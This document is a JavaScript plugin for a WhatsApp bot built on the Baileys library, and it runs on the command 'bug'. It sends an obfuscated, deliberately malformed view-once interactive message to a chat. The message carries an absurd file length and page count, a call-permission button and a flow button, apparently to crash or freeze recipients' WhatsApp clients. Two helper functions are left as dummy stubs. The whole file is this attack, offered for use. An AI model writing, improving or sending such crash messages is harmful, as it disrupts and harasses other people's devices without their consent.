import pkg from '@whiskeysockets/baileys';
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = pkg;

const _0x20a28c = {
  name: "galaxy_message",
  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"🦄드림 가이 Xeon\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄드림 가이 Xeon\"}"
};

let handler = async (m, { conn, args, text, usedPrefix, command }) => {
  const _0x8fddfa = conn;
  const _0x4678cc = m;
  const _0x1117bd = "document_content";
  const _0x30c87e = async (options) => options;  // Dummy function for preparing message media
  const _0x1501c4 = async (data, width, height) => "jpeg_thumbnail";  // Dummy function for generating thumbnail
  const _0x272a00 = "Body content";

  await _0x8fddfa.relayMessage(_0x4678cc.chat, {
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            ...(await _0x30c87e({
              'document': _0x1117bd,
              'fileName': "🦄드림 가이 Xeon",
              'fileLength': "9999999999999",
              'pageCount': 0x9184e729fff,
              'contactVcard': true,
              'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              'jpegThumbnail': await _0x1501c4("image_data", 276, 100)
            })),
            'title': "🦄드림 가이 Xeon",
            'hasMediaAttachment': true
          },
          'body': _0x272a00,
          'nativeFlowMessage': {
            'messageParamsJson': '',
            'buttons': [{
              'name': "call_permission_request",
              'buttonParamsJson': '{}'
            }, _0x20a28c]
          }
        }
      }
    }
  }, {});
};

handler.command = /^(bug)$/i;
export default handler;